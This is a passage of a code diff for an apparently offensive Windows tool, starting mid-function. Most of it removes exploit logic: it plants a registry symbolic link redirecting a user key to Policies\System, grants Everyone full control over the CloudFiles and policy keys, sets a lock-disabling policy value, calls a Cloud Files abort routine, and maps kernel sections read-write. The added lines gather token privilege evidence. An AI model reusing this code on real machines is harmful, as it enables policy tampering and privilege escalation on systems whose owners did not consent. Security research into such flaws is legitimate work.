+    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && needed != 0) {
+        tokenUser = (PTOKEN_USER)malloc(needed);
+        if (tokenUser &&
+            GetTokenInformation(token, TokenUser, tokenUser, needed, &returned) &&
+            ConvertSidToStringSidW(tokenUser->User.Sid, &sidString)) {
+            wcsncpy_s(evidence.sid, ARRAYSIZE(evidence.sid), sidString, _TRUNCATE);
         }
     }
-    else {
-        wprintf(L"%ls=fail NT=0x%08lx\n", label, (DWORD)status);
-    }
 
-    free(buffer);
-}
-
-static void PrintKernelObjectSecurityBrief(HANDLE handle, const wchar_t* label)
-{
-    PSECURITY_DESCRIPTOR sd = NULL;
-    PSID owner = NULL;
-    PSID group = NULL;
-    PACL dacl = NULL;
-    LPWSTR sddl = NULL;
-    DWORD res = ERROR_SUCCESS;
-
-    if (!handle || handle == INVALID_HANDLE_VALUE) {
-        return;
-    }
-
-    res = GetSecurityInfo(
-        handle,
-        SE_KERNEL_OBJECT,
-        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
-        &owner,
-        &group,
-        &dacl,
-        NULL,
-        &sd);
-    if (res != ERROR_SUCCESS) {
-        TraceWin32Context(label ? label : L"section_security", L"GetSecurityInfo", L"section", res);
-        return;
-    }
-
-    if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
-            sd,
-            SDDL_REVISION_1,
-            OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
-            &sddl,
-            NULL)) {
-        wprintf(L"%ls=%ls\n", label ? label : L"section_security", sddl);
-        LocalFree(sddl);
-    }
-    else {
-        TraceWin32Context(
-            label ? label : L"section_security",
-            L"ConvertSecurityDescriptorToStringSecurityDescriptorW",
-            L"section",
-            GetLastError());
-    }
-
-    if (sd) {
-        LocalFree(sd);
-    }
-}
-
-static void PrintSectionObjectDiagnostics(const wchar_t* phase, HANDLE handle)
-{
-    GP_OBJECT_BASIC_INFORMATION basic = { 0 };
-
-    if (!handle || handle == INVALID_HANDLE_VALUE) {
-        return;
-    }
-
-    wprintf(L"section_diag phase=%ls handle=0x%p\n", phase ? phase : L"<none>", handle);
-    if (QueryBasic(handle, &basic)) {
-        wprintf(
-            L"section_basic attrs=0x%08lx handles=%lu refs=%lu\n",
-            basic.Attributes,
-            basic.HandleCount,
-            basic.PointerCount);
-        PrintLabeledAccessEvidence(L"section_diag_access", basic.GrantedAccess);
-    }
-
-    PrintObjectUnicodeBrief(handle, GP_OBJECT_TYPE_INFORMATION_CLASS, L"section_type");
-    PrintObjectUnicodeBrief(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"section_name");
-    PrintKernelObjectSecurityBrief(handle, L"section_security");
-}
-
-static void LogHandleSnapshot(const wchar_t* phase, const wchar_t* label, HANDLE handle)
-{
-#if GP_VERBOSE_TRACE
-    GP_OBJECT_BASIC_INFORMATION basic = { 0 };
-
-    if (!handle || handle == INVALID_HANDLE_VALUE) {
-        return;
-    }
-
-    if (QueryBasic(handle, &basic)) {
-        PrintAccessEvidence(basic.GrantedAccess);
-        PrintTimestamp(phase);
-        wprintf(L"%ls handle=0x%p handles=%lu refs=%lu attrs=0x%08lx\n",
-            label,
-            handle,
-            basic.HandleCount,
-            basic.PointerCount,
-            basic.Attributes);
-    }
-
-    QueryObjectUnicode(handle, GP_OBJECT_TYPE_INFORMATION_CLASS, L"type");
-    QueryObjectUnicode(handle, GP_OBJECT_NAME_INFORMATION_CLASS, L"name");
-    LogKernelObjectSecurity(handle);
-#else
-    UNREFERENCED_PARAMETER(phase);
-    UNREFERENCED_PARAMETER(label);
-    UNREFERENCED_PARAMETER(handle);
-#endif
-}
-
-static void LogRegistryState(const wchar_t* phase)
-{
-#if GP_VERBOSE_TRACE
-    HKEY hk = NULL;
-    wchar_t data[1024] = { 0 };
-    DWORD type = 0;
-    DWORD bytes = sizeof(data);
-    DWORD res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        GP_REG_BLOCKED_APPS,
-        REG_OPTION_OPEN_LINK,
-        KEY_QUERY_VALUE,
-        &hk);
-
-    if (res == ERROR_SUCCESS) {
-        res = RegQueryValueExW(hk, GP_REG_LINK_VALUE_NAME, NULL, &type, (LPBYTE)data, &bytes);
-        PrintTimestamp(phase);
-        if (res == ERROR_SUCCESS) {
-            wprintf(L"reglink type=%lu target=%ls\n", type, data);
-        }
-        else {
-            wprintf(L"reglink query=%lu\n", res);
-        }
-        RegCloseKey(hk);
-    }
-
-    DWORD value = 0;
-    bytes = sizeof(value);
-    res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        GP_REG_SYSTEM_POLICIES,
-        0,
-        KEY_QUERY_VALUE,
-        &hk);
-    if (res == ERROR_SUCCESS) {
-        res = RegQueryValueExW(hk, GP_REG_DISABLE_LOCK_VALUE_NAME, NULL, &type, (LPBYTE)&value, &bytes);
-        PrintTimestamp(phase);
-        if (res == ERROR_SUCCESS) {
-            wprintf(L"policy type=%lu value=%lu\n", type, value);
-        }
-        else {
-            wprintf(L"policy query=%lu\n", res);
-        }
-        RegCloseKey(hk);
-    }
-#else
-    UNREFERENCED_PARAMETER(phase);
-#endif
-}
-
-// Section acquisition and registry transition helpers.
-static bool OpenSectionWithTimeout(
-    POBJECT_ATTRIBUTES objattr,
-    HANDLE* sectionHandle,
-    NTSTATUS* finalStatus,
-    DWORD* elapsedMs)
-{
-    ULONGLONG start = GetTickCount64();
-    ULONGLONG lastLog = start;
-    NTSTATUS lastStatus = STATUS_UNSUCCESSFUL;
-
-    *sectionHandle = NULL;
-    while (true) {
-        HANDLE candidate = NULL;
-        NTSTATUS status = _NtOpenSection(&candidate, MAXIMUM_ALLOWED, objattr);
-        if (NT_SUCCESS(status) && candidate) {
-            *sectionHandle = candidate;
-            if (finalStatus) {
-                *finalStatus = status;
+    needed = 0;
+    GetTokenInformation(token, TokenIntegrityLevel, NULL, 0, &needed);
+    if (GetLastError() == ERROR_INSUFFICIENT_BUFFER && needed != 0) {
+        integrity = (PTOKEN_MANDATORY_LABEL)malloc(needed);
+        if (integrity &&
+            GetTokenInformation(token, TokenIntegrityLevel, integrity, needed, &returned)) {
+            DWORD count = *GetSidSubAuthorityCount(integrity->Label.Sid);
+            if (count != 0) {
+                evidence.integrityRid = *GetSidSubAuthority(integrity->Label.Sid, count - 1);
+                evidence.integrity = IntegrityName(evidence.integrityRid);
             }
-            if (elapsedMs) {
-                *elapsedMs = (DWORD)(GetTickCount64() - start);
-            }
-            return true;
-        }
-
-        lastStatus = status;
-        ULONGLONG now = GetTickCount64();
-        if (now - lastLog >= GP_OPEN_STATUS_LOG_MS) {
-#if GP_VERBOSE_TRACE
-            TraceNtStatus(L"P3", L"open", lastStatus);
-#endif
-            lastLog = now;
-        }
-
-        if (now - start >= GP_OPEN_TIMEOUT_MS) {
-            if (finalStatus) {
-                *finalStatus = lastStatus;
-            }
-            if (elapsedMs) {
-                *elapsedMs = (DWORD)(now - start);
-            }
-            TraceNtStatus(L"P3", L"open", lastStatus);
-            return false;
-        }
-
-        Sleep(GP_OPEN_POLL_MS);
-    }
-}
-
-static NTSTATUS DeleteRegistryLinkKey(HKEY hk)
-{
-    if (hk && _NtDeleteKey) {
-        return _NtDeleteKey(hk);
-    }
-    return STATUS_UNSUCCESSFUL;
-}
-
-static DWORD PrepareRegistryTargetKey(HKEY root, const wchar_t* subKey, REGSAM desiredAccess, bool* created)
-{
-    HKEY key = NULL;
-    DWORD disposition = 0;
-
-    if (!root || !subKey || !subKey[0]) {
-        return ERROR_INVALID_PARAMETER;
-    }
-
-    DWORD res = RegCreateKeyExW(
-        root,
-        subKey,
-        0,
-        NULL,
-        REG_OPTION_NON_VOLATILE,
-        desiredAccess,
-        NULL,
-        &key,
-        &disposition);
-
-    if (key) {
-        RegCloseKey(key);
-    }
-
-    if (res == ERROR_SUCCESS && created) {
-        *created = *created || (disposition == REG_CREATED_NEW_KEY);
-    }
-
-    return res;
-}
-
-static void TryPrepareRegistryTargetKey(const wchar_t* subKey, const REGSAM* accessMasks, SIZE_T maskCount, bool* created)
-{
-    DWORD lastError = ERROR_INVALID_PARAMETER;
-
-    if (!accessMasks || maskCount == 0) {
-        TraceWin32WarningContext(L"reg_prepare", L"RegCreateKeyExW", subKey, lastError);
-        return;
-    }
-
-    for (SIZE_T i = 0; i < maskCount; ++i) {
-        bool createdBefore = created ? *created : false;
-        DWORD res = PrepareRegistryTargetKey(HKEY_CURRENT_USER, subKey, accessMasks[i], created);
-        if (res == ERROR_SUCCESS) {
-            wprintf(
-                L"reg_prepare=ok target=%ls access=0x%08lx created=%u\n",
-                subKey,
-                (DWORD)accessMasks[i],
-                (created && !createdBefore && *created) ? 1 : 0);
-            return;
-        }
-
-        lastError = res;
-    }
-
-    TraceWin32WarningContext(L"reg_prepare", L"RegCreateKeyExW", subKey, lastError);
-}
-
-static void TryPrepareRegistryTargetKey(const wchar_t* subKey, REGSAM desiredAccess, bool* created)
-{
-    TryPrepareRegistryTargetKey(subKey, &desiredAccess, 1, created);
-}
-
-static void TouchRegistryTargetThroughLink(const wchar_t* linkSubKey, bool* created, bool* touched)
-{
-    static const REGSAM accessMasks[] = {
-        KEY_READ | KEY_SET_VALUE | WRITE_DAC,
-        KEY_READ | KEY_SET_VALUE,
-        KEY_SET_VALUE,
-        KEY_READ
-    };
-    DWORD lastError = ERROR_INVALID_PARAMETER;
-
-    if (touched) {
-        *touched = false;
-    }
-
-    for (SIZE_T i = 0; i < ARRAYSIZE(accessMasks); ++i) {
-        HKEY key = NULL;
-        DWORD disposition = 0;
-        DWORD res = RegCreateKeyExW(
-            HKEY_CURRENT_USER,
-            linkSubKey,
-            0,
-            NULL,
-            REG_OPTION_NON_VOLATILE,
-            accessMasks[i],
-            NULL,
-            &key,
-            &disposition);
-        if (res == ERROR_SUCCESS) {
-            if (created) {
-                *created = *created || (disposition == REG_CREATED_NEW_KEY);
-            }
-            if (touched) {
-                *touched = true;
-            }
-            wprintf(
-                L"reg_link_touch=ok target=%ls access=0x%08lx created=%u\n",
-                linkSubKey,
-                (DWORD)accessMasks[i],
-                disposition == REG_CREATED_NEW_KEY ? 1 : 0);
-            RegCloseKey(key);
-            return;
-        }
-
-        lastError = res;
-    }
-
-    TraceWin32WarningContext(L"reg_link_touch", L"RegCreateKeyExW(follow-link)", linkSubKey, lastError);
-}
-
-static DWORD OpenPolicySystemValueKey(REGSAM access, HKEY* key, const wchar_t** openedPath, bool critical)
-{
-    DWORD res = ERROR_INVALID_PARAMETER;
-
-    if (!key) {
-        return ERROR_INVALID_PARAMETER;
-    }
-
-    *key = NULL;
-    if (openedPath) {
-        *openedPath = NULL;
-    }
-
-    res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        GP_REG_SYSTEM_POLICIES,
-        0,
-        access,
-        key);
-    if (res == ERROR_SUCCESS) {
-        if (openedPath) {
-            *openedPath = GP_REG_SYSTEM_POLICIES;
-        }
-        return ERROR_SUCCESS;
-    }
-    TraceWin32WarningContext(L"reg_open", L"RegOpenKeyExW", GP_REG_SYSTEM_POLICIES, res);
-
-    res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        GP_REG_BLOCKED_APPS,
-        0,
-        access,
-        key);
-    if (res == ERROR_SUCCESS) {
-        if (openedPath) {
-            *openedPath = GP_REG_BLOCKED_APPS;
-        }
-        wprintf(L"reg_open=ok target=%ls mode=follow-link\n", GP_REG_BLOCKED_APPS);
-        return ERROR_SUCCESS;
-    }
-
-    if (critical) {
-        TraceWin32Context(L"reg", L"RegOpenKeyExW(follow-link)", GP_REG_BLOCKED_APPS, res);
-    }
-    else {
-        TraceWin32WarningContext(L"reg_open", L"RegOpenKeyExW(follow-link)", GP_REG_BLOCKED_APPS, res);
-    }
-    return res;
-}
-
-static void DeleteCreatedRegistryKey(const wchar_t* subKey, bool created)
-{
-    if (!created || !subKey || !subKey[0]) {
-        return;
-    }
-
-    DWORD res = RegDeleteKeyW(HKEY_CURRENT_USER, subKey);
-    if (res != ERROR_SUCCESS && res != ERROR_FILE_NOT_FOUND) {
-        TraceWin32Context(L"cleanup", L"RegDeleteKeyW", subKey, res);
-    }
-}
-
-static void DeleteCreatedRegistryLinkKey(const wchar_t* subKey, bool created)
-{
-    if (!created || !subKey || !subKey[0]) {
-        return;
-    }
-
-    HKEY hk = NULL;
-    DWORD res = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        subKey,
-        REG_OPTION_OPEN_LINK,
-        DELETE,
-        &hk);
-    if (res == ERROR_FILE_NOT_FOUND) {
-        return;
-    }
-    if (res != ERROR_SUCCESS) {
-        TraceWin32Context(L"cleanup", L"RegOpenKeyExW", subKey, res);
-        return;
-    }
-
-    NTSTATUS status = DeleteRegistryLinkKey(hk);
-    if (!NT_SUCCESS(status)) {
-        TraceNtStatusContext(L"cleanup", L"NtDeleteKey", subKey, status);
-    }
-    RegCloseKey(hk);
-}
-
-static void CleanupRegistryEvidence(const GpRegistryEvidence* registry)
-{
-    if (!registry || !registry->attempted) {
-        return;
-    }
-
-    if (registry->disableLockSet) {
-        HKEY hk = NULL;
-        const wchar_t* openedPath = NULL;
-        DWORD res = OpenPolicySystemValueKey(KEY_SET_VALUE, &hk, &openedPath, false);
-        if (res == ERROR_SUCCESS) {
-            DWORD delRes = RegDeleteValueW(hk, GP_REG_DISABLE_LOCK_VALUE_NAME);
-            if (delRes != ERROR_SUCCESS && delRes != ERROR_FILE_NOT_FOUND) {
-                TraceWin32Context(L"cleanup", L"RegDeleteValueW", openedPath ? openedPath : GP_REG_DISABLE_LOCK_VALUE_NAME, delRes);
-            }
-            RegCloseKey(hk);
-        }
-        else if (res != ERROR_FILE_NOT_FOUND) {
-            TraceWin32Context(L"cleanup", L"OpenPolicySystemValueKey", GP_REG_SYSTEM_POLICIES, res);
         }
     }
 
-    DeleteCreatedRegistryLinkKey(
-        GP_REG_BLOCKED_APPS,
-        registry->blockedAppsLinkCreated);
-    DeleteCreatedRegistryKey(
-        GP_REG_SYSTEM_POLICIES,
-        registry->policiesSystemKeyCreated);
-    DeleteCreatedRegistryKey(
-        GP_REG_CLOUDFILES,
-        registry->cloudFilesKeyCreated);
-}
-
-static bool SetPolicyVal(GpRegistryEvidence* registry)
-{
-    bool ret = true;
-    DWORD val = 1;
-    DWORD dwRes = ERROR_SUCCESS;
-    HKEY hk = NULL;
-    DWORD res = ERROR_SUCCESS;
-    DWORD failure = ERROR_SUCCESS;
-    PACL pACL = NULL;
-    EXPLICIT_ACCESSW ea;
-    HKEY policyKey = NULL;
-    HANDLE htoken = NULL;
-    DWORD dwSize = 0;
-    wchar_t* stringSid = NULL;
-    wchar_t linktarget[MAX_PATH] = { 0 };
-    PTOKEN_USER pTokenUser = NULL;
-    bool linkKeyOpen = false;
-    DWORD linkKeyDisposition = 0;
-    const wchar_t* openedPolicyPath = NULL;
-    bool openedPolicyViaLink = false;
-
-    if (registry) {
-        ZeroMemory(registry, sizeof(*registry));
-        registry->attempted = true;
+    if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &returned)) {
+        evidence.elevated = elevation.TokenIsElevated ? true : false;
     }
-
-    CallCfAbortOperation(L"P4");
-
-    ZeroMemory(&ea, sizeof(ea));
-    ea.grfAccessPermissions = GENERIC_ALL;
-    ea.grfAccessMode = SET_ACCESS;
-    ea.grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
-    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
-    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
-    ea.Trustee.ptstrName = (LPWSTR)L"Everyone";
-
-    dwRes = SetEntriesInAclW(1, &ea, NULL, &pACL);
-    if (ERROR_SUCCESS != dwRes) {
-        failure = dwRes;
-        TraceWin32Context(L"acl", L"SetEntriesInAclW", L"Everyone", dwRes);
-        goto cleanup;
+    if (GetTokenInformation(token, TokenElevationType, &elevationType, sizeof(elevationType), &returned)) {
+        evidence.elevationType = elevationType;
     }
-
-    TryPrepareRegistryTargetKey(
-        GP_REG_CLOUDFILES,
-        KEY_READ,
-        registry ? &registry->cloudFilesKeyCreated : NULL);
-
-    res = TreeSetNamedSecurityInfoW(
-        (LPWSTR)GP_REG_CLOUDFILES_NAMED,
-        SE_REGISTRY_KEY,
-        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
-        NULL,
-        NULL,
-        pACL,
-        NULL,
-        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
-        NULL,
-        ProgressInvokeNever,
-        NULL);
-    if (res) {
-        failure = res;
-        TraceWin32Context(L"acl", L"TreeSetNamedSecurityInfoW", GP_REG_CLOUDFILES_NAMED, res);
-        goto cleanup;
-    }
-    if (registry) {
-        registry->cloudFilesDaclSet = true;
-    }
-
-    res = RegDeleteTreeW(HKEY_CURRENT_USER, GP_REG_BLOCKED_APPS);
-    if (res && res != ERROR_FILE_NOT_FOUND) {
-        failure = res;
-        TraceWin32Context(L"reg", L"RegDeleteTreeW", GP_REG_BLOCKED_APPS, res);
-        goto cleanup;
-    }
-
-    res = RegCreateKeyExW(
-        HKEY_CURRENT_USER,
-        GP_REG_BLOCKED_APPS,
-        0,
-        NULL,
-        REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE,
-        KEY_ALL_ACCESS,
-        NULL,
-        &hk,
-        &linkKeyDisposition);
-    if (res) {
-        failure = res;
-        TraceWin32Context(L"reg", L"RegCreateKeyExW(REG_OPTION_CREATE_LINK)", GP_REG_BLOCKED_APPS, res);
-        goto cleanup;
-    }
-    linkKeyOpen = true;
-    if (registry) {
-        registry->blockedAppsLinkCreated = (linkKeyDisposition == REG_CREATED_NEW_KEY);
-    }
-
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-        failure = GetLastError();
-        TraceWin32Context(L"token", L"OpenProcessToken", L"TokenUser", failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-
-    GetTokenInformation(htoken, TokenUser, NULL, 0, &dwSize);
-    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
-        failure = GetLastError();
-        TraceWin32Context(L"token", L"GetTokenInformation(size)", L"TokenUser", failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-
-    pTokenUser = (PTOKEN_USER)malloc(dwSize);
-    if (!pTokenUser) {
-        failure = ERROR_OUTOFMEMORY;
-        TraceWin32Context(L"token", L"malloc", L"TokenUser", failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-
-    if (!GetTokenInformation(htoken, TokenUser, pTokenUser, dwSize, &dwSize)) {
-        failure = GetLastError();
-        TraceWin32Context(L"token", L"GetTokenInformation", L"TokenUser", failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-    CloseHandle(htoken);
-    htoken = NULL;
-
-    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &stringSid)) {
-        failure = GetLastError();
-        TraceWin32Context(L"sid", L"ConvertSidToStringSidW", L"TokenUser", failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-
-    if (swprintf_s(
-            linktarget,
-            L"\\REGISTRY\\USER\\%ls\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
-            stringSid) < 0) {
-        failure = ERROR_INSUFFICIENT_BUFFER;
-        TraceWin32Context(L"reg", L"BuildRegistryLinkTarget", GP_REG_LINK_VALUE_NAME, failure);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-    wprintf(L"reglink target=%ls\n", linktarget);
-
-    res = RegSetValueExW(
-        hk,
-        GP_REG_LINK_VALUE_NAME,
-        0,
-        REG_LINK,
-        (BYTE*)linktarget,
-        (DWORD)(wcslen(linktarget) * sizeof(wchar_t)));
-    if (res) {
-        failure = res;
-        TraceWin32Context(L"reg", L"RegSetValueExW(REG_LINK)", GP_REG_LINK_VALUE_NAME, res);
-        DeleteRegistryLinkKey(hk);
-        linkKeyOpen = false;
-        goto cleanup;
-    }
-    if (registry) {
-        registry->linkValueSet = true;
-    }
-    res = RegFlushKey(hk);
-    if (res) {
-        TraceWin32WarningContext(L"reg", L"RegFlushKey", GP_REG_BLOCKED_APPS, res);
-    }
-
-    CallCfAbortOperation(L"P4");
-    TouchRegistryTargetThroughLink(
-        GP_REG_BLOCKED_APPS,
-        registry ? &registry->policiesSystemKeyCreated : NULL,
-        registry ? &registry->linkedTargetTouched : NULL);
-    TryPrepareRegistryTargetKey(
-        GP_REG_SYSTEM_POLICIES,
-        GP_REG_SYSTEM_TARGET_ACCESS_MASKS,
-        ARRAYSIZE(GP_REG_SYSTEM_TARGET_ACCESS_MASKS),
-        registry ? &registry->policiesSystemKeyCreated : NULL);
-
-    res = TreeSetNamedSecurityInfoW(
-        (LPWSTR)GP_REG_SYSTEM_POLICIES_NAMED,
-        SE_REGISTRY_KEY,
-        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
-        NULL,
-        NULL,
-        pACL,
-        NULL,
-        TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
-        NULL,
-        ProgressInvokeNever,
-        NULL);
-    if (res) {
-        DWORD fallbackRes = ERROR_SUCCESS;
-        TraceWin32WarningContext(L"acl", L"TreeSetNamedSecurityInfoW", GP_REG_SYSTEM_POLICIES_NAMED, res);
-        fallbackRes = TreeSetNamedSecurityInfoW(
-            (LPWSTR)GP_REG_BLOCKED_APPS_NAMED,
-            SE_REGISTRY_KEY,
-            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
-            NULL,
-            NULL,
-            pACL,
-            NULL,
-            TREE_SEC_INFO_RESET_KEEP_EXPLICIT,
-            NULL,
-            ProgressInvokeNever,
-            NULL);
-        if (fallbackRes) {
-            TraceWin32WarningContext(L"acl", L"TreeSetNamedSecurityInfoW(follow-link)", GP_REG_BLOCKED_APPS_NAMED, fallbackRes);
-        }
-        else if (registry) {
-            registry->policiesDaclSet = true;
-            wprintf(L"acl=ok target=%ls mode=follow-link\n", GP_REG_BLOCKED_APPS_NAMED);
-        }
-    }
-    else if (registry) {
-        registry->policiesDaclSet = true;
-    }
-
-    res = OpenPolicySystemValueKey(KEY_SET_VALUE, &policyKey, &openedPolicyPath, true);
-    if (res) {
-        failure = res;
-        goto cleanup;
-    }
-    openedPolicyViaLink = (openedPolicyPath && wcscmp(openedPolicyPath, GP_REG_BLOCKED_APPS) == 0);
-
-    if (hk && !openedPolicyViaLink) {
-        DeleteRegistryLinkKey(hk);
-        RegCloseKey(hk);
-        hk = NULL;
-        linkKeyOpen = false;
-    }
-    else if (hk) {
-        RegCloseKey(hk);
-        hk = NULL;
-        linkKeyOpen = false;
-        wprintf(L"reg_link=kept target=%ls reason=value-opened-via-link\n", GP_REG_BLOCKED_APPS);
-    }
-
-    res = RegSetValueExW(policyKey, GP_REG_DISABLE_LOCK_VALUE_NAME, 0, REG_DWORD, (BYTE*)&val, sizeof(DWORD));
-    if (res) {
-        failure = res;
-        TraceWin32Context(L"reg", L"RegSetValueExW(REG_DWORD)", openedPolicyPath ? openedPolicyPath : GP_REG_DISABLE_LOCK_VALUE_NAME, res);
-        goto cleanup;
-    }
-    if (registry) {
-        registry->disableLockSet = true;
-    }
-    wprintf(L"reg_value=ok target=%ls value=%ls\n", openedPolicyPath ? openedPolicyPath : GP_REG_SYSTEM_POLICIES, GP_REG_DISABLE_LOCK_VALUE_NAME);
-
-exit:
-    if (pACL) {
-        LocalFree(pACL);
-    }
-    if (stringSid) {
-        LocalFree(stringSid);
-    }
-    if (pTokenUser) {
-        free(pTokenUser);
-    }
-    if (htoken) {
-        CloseHandle(htoken);
-    }
-    if (policyKey) {
-        RegCloseKey(policyKey);
-    }
-    if (hk) {
-        if (!ret && linkKeyOpen) {
-            DeleteRegistryLinkKey(hk);
-        }
-        RegCloseKey(hk);
-    }
-    if (registry) {
-        registry->succeeded = ret;
-        registry->win32Error = ret ? ERROR_SUCCESS : (failure ? failure : ERROR_GEN_FAILURE);
-        if (!ret) {
-            wprintf(
-                L"registry_progress cloud_key=%u cloud_dacl=%u link_key=%u link_value=%u linked_target=%u system_key=%u system_dacl=%u disable_lock=%u\n",
-                registry->cloudFilesKeyCreated ? 1 : 0,
-                registry->cloudFilesDaclSet ? 1 : 0,
-                registry->blockedAppsLinkCreated ? 1 : 0,
-                registry->linkValueSet ? 1 : 0,
-                registry->linkedTargetTouched ? 1 : 0,
-                registry->policiesSystemKeyCreated ? 1 : 0,
-                registry->policiesDaclSet ? 1 : 0,
-                registry->disableLockSet ? 1 : 0);
-            wprintf(
-                L"registry_error code=%lu W32=0x%08lx\n",
-                registry->win32Error,
-                registry->win32Error);
-        }
-    }
-    LogRegistryState(L"P4");
-    wprintf(L"registry=%ls\n", ret ? L"ok" : L"fail");
-    return ret;
-
-cleanup:
-    ret = false;
-    goto exit;
-}
-
-// Section mapping, compact fingerprinting, and optional prefix dump.
-static GpSectionView MapSectionViewWithLabel(HANDLE section, const wchar_t* label)
-{
-    GpSectionView view = { 0 };
-    LARGE_INTEGER offset = { 0 };
-    SIZE_T viewSize = 0;
-    PVOID base = NULL;
-    const wchar_t* mapLabel = label ? label : L"map";
-
-    NTSTATUS status = _NtMapViewOfSection(
-        section,
-        GetCurrentProcess(),
-        &base,
-        0,
-        0,
-        &offset,
-        &viewSize,
-        GP_VIEW_SHARE,
-        0,
-        PAGE_READWRITE);
-
-    if (NT_SUCCESS(status)) {
-        view.base = base;
-        view.size = viewSize;
-        view.writable = true;
-        view.mode = GpMapMode::ReadWrite;
-        view.status = status;
-        wprintf(L"%ls=rw size=%zu\n", mapLabel, viewSize);
-        return view;
-    }
-
-    base = NULL;
-    viewSize = 0;
-    status = _NtMapViewOfSection(
-        section,
-        GetCurrentProcess(),
-        &base,
-        0,
-        0,
-        &offset,
-        &viewSize,
-        GP_VIEW_SHARE,
-        0,
-        PAGE_READONLY);
-
-    view.status = status;
-    if (NT_SUCCESS(status)) {
-        view.base = base;
-        view.size = viewSize;
-        view.writable = false;
-        view.mode = GpMapMode::ReadOnly;
-        wprintf(L"%ls=ro size=%zu\n", mapLabel, viewSize);
-    }
-    else {
-        view.mode = GpMapMode::None;
-        wprintf(L"%ls=fail NT=0x%08lx\n", mapLabel, (DWORD)status);
-    }
-
-    return view;
-}
-
-static GpSectionView MapSectionView(HANDLE section)
-{
-    return MapSectionViewWithLabel(section, L"map");
-}
-
-static void ReleaseSectionView(GpSectionView* view)
-{
-    if (!view || !view->base) {
-        return;
-    }
-
-    _NtUnmapViewOfSection(GetCurrentProcess(), view->base);
-    view->base = NULL;
-    view->size = 0;
-    view->writable = false;
-    view->mode = GpMapMode::None;
-    view->status = STATUS_UNSUCCESSFUL;
-}
-
-static void DumpSectionPrefix(const GpSectionView* view)
-{
-#if GP_ENABLE_SECTION_DUMP
-    if (!view || !view->base || !view->size) {
-        return;
-    }
-
-    SIZE_T count = view->size < 256 ? view->size : 256;
-    BYTE* bytes = (BYTE*)view->base;
-    for (SIZE_T offset = 0; offset < count; offset += 16) {
-        SIZE_T line = (count - offset) < 16 ? (count - offset) : 16;
-        wprintf(L"dump[%04zx]=", offset);
-        for (SIZE_T i = 0; i < line; ++i) {
-            wprintf(L"%02x", bytes[offset + i]);
-        }
-        wprintf(L"\n");
-    }
-#else
-    UNREFERENCED_PARAMETER(view);
-#endif
-}
-
-static void CaptureSectionFingerprint(GpRunEvidence* run)
-{
-    const DWORD fnvOffset = 2166136261u;
-    const DWORD fnvPrime = 16777619u;
-    DWORD hash = fnvOffset;
-
-    if (!run || !run->view.base || !run->view.size) {
-        return;
-    }
-
-    SIZE_T count = run->view.size < 256 ? run->view.size : 256;
-    BYTE* bytes = (BYTE*)run->view.base;
-    for (SIZE_T i = 0; i < count; ++i) {
-        hash ^= bytes[i];
-        hash *= fnvPrime;
-    }
-
-    run->sectionFingerprint = hash;
-    run->fingerprintBytes = count;
-    wprintf(
-        L"fingerprint=0x%08lx bytes=%zu mode=%ls\n",
-        hash,
-        count,
-        GpMapModeName(run->view.mode));
-}
-
-static bool RefreshWritableSectionView(GpRunEvidence* run, POBJECT_ATTRIBUTES objattr)
-{
-    static const ACCESS_MASK desiredAccesses[] = {
-        SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE,
-        SECTION_QUERY | SECTION_MAP_WRITE,
-        SECTION_MAP_READ | SECTION_MAP_WRITE,
-        SECTION_MAP_WRITE,
-        SECTION_QUERY | SECTION_MAP_READ | SECTION_MAP_WRITE | WRITE_DAC,
-        MAXIMUM_ALLOWED
-    };
-
-    if (!run || !objattr) {
-        return false;
-    }
-
-    if (run->view.writable) {
-        wprintf(L"section_refresh=skip reason=already-writable\n");
-        return true;
-    }
-
-    for (SIZE_T i = 0; i < ARRAYSIZE(desiredAccesses); ++i) {
-        HANDLE candidate = NULL;
-        ACCESS_MASK granted = run->grantedAccess;
-        GpSectionView candidateView = { 0 };
-        ACCESS_MASK desired = desiredAccesses[i];
-        NTSTATUS status = _NtOpenSection(&candidate, desired, objattr);
-
-        wprintf(
-            L"section_reopen desired=0x%08lx NT=0x%08lx\n",
-            desired,
-            (DWORD)status);
-
-        if (!NT_SUCCESS(status) || !candidate) {
-            if (candidate) {
-                CloseHandle(candidate);
-            }
-            continue;
-        }
-
-        if (CaptureGrantedAccess(candidate, &granted)) {
-            PrintLabeledAccessEvidence(L"section_reopen_access", granted);
-        }
-        else {
